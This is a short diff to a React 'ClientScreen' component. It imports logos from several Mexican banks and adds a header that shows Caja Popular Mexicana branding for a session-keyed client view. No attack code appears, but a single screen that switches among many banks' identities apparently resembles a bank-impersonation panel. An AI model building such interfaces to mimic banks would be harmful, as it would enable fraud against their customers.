@@ -28,7 +28,7 @@ import banregioLogoWhite from '../assets/banregio_logo_white.png';
 import platacardLogo from '../assets/platacard_logo.png';
 import bancoAztecaLogo from '../assets/banco_azteca_logo.png';
 import bienestarLogo from '../assets/banco_bienestar_logo.png';
-import cajaPopularLogo from '../assets/caja_popular_logo.png';
+import cajaPopularLogo from '@assets/caja-popular-mexicana-seeklogo_1755713724358.png';
 
 export default function ClientScreen() {
   // Verificar primero la ruta /client/:sessionId
@@ -383,6 +383,20 @@ export default function ClientScreen() {
               src={bienestarLogo} 
               className="bienestar-logo inline-block" 
               alt="Banco del Bienestar" 
+              style={{height: '2.5rem', width: 'auto'}}
+            />
+          </div>
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
+        </header>
+      );
+    } else if (sessionData.banco === 'CAJAPOPULAR') {
+      return (
+        <header className="cajapopular-header text-center">
+          <div className="flex justify-center mb-2">
+            <img 
+              src={cajaPopularLogo} 
+              className="cajapopular-logo inline-block" 
+              alt="Caja Popular Mexicana" 
               style={{height: '2.5rem', width: 'auto'}}
             />
           </div>
